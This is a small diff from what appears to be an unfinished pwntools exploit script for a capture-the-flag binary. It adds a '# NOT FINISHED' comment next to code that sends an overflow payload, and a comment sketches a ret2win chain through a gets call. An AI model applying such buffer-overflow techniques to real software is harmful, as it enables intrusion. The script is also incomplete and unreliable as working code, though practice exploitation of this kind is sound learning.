@@ -14,6 +14,6 @@ payload += p32(0xdeadbeef)
 p.sendline(payload)
 p.interactive()
 
-
+# NOT FINISHED
 
 #we can send the payload on the second gets ; the payload will look something like this offset+winaddress+4(for mangling base p)+arg1
